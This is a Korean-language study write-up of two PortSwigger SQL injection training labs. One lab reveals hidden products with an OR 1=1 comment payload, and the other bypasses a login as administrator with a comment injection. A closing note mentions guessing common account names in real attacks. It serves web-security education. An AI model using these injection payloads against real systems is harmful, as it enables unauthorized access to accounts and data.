# PortSwigger Labs — SQL Injection

## Lab 1 — WHERE절 숨겨진 데이터 조회

**링크**: `portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data`

### 목표
카테고리 필터에서 미출시 상품(released = 0)까지 전부 출력하기

### 상황
쇼핑몰의 카테고리 필터 클릭 시 URL이 바뀜:
```
/filter?category=Gifts
```

서버 내부 쿼리:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-- released = 1 조건 때문에 출시된 상품만 보임
```

### 풀이
URL의 category 값을 직접 수정:
```
/filter?category=Gifts'+OR+1=1--
```

실행되는 쿼리:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- OR 1=1 → 항상 참
-- -- 이후 주석 처리 → released 조건 무력화
-- 결과: 모든 상품 출력
```

---

## Lab 2 — 로그인 우회

**링크**: `portswigger.net/web-security/sql-injection/lab-login-bypass`

### 목표
administrator 계정으로 비밀번호 없이 로그인하기

### 상황
로그인 시 서버 내부 쿼리:
```sql
SELECT * FROM users WHERE username = '입력값' AND password = '입력값'
```

### 풀이
로그인 폼에 입력:
```
username: administrator'--
password: (아무거나)
```

실행되는 쿼리:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '아무거나'
-- -- 이후 주석 처리 → AND password = ... 조건이 사라짐
-- 비밀번호 검증 없이 administrator로 로그인 성공
```

### 참고
꼭 administrator일 필요는 없음. 실제 공격에서는:
- `admin`, `root` 등 흔한 계정명 추측
- `' OR 1=1--` 으로 DB의 첫 번째 유저로 로그인
